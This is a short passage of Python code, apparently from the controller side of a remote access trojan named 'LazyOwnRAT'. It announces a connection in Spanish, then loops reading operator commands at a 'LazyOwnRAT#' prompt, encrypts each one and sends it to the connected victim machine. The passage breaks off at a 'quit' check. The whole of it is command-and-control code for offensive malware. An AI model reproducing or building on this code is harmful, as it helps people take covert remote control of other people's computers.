    print(f'[+] Conexión establecida con {addr}')
    try:
        while True:
            cmd = input('LazyOwnRAT# ').strip()

            if cmd == '':
                continue

            conn.send(encrypt(cmd.encode('utf-8'), key))

            if cmd == 'quit':
                conn.close()
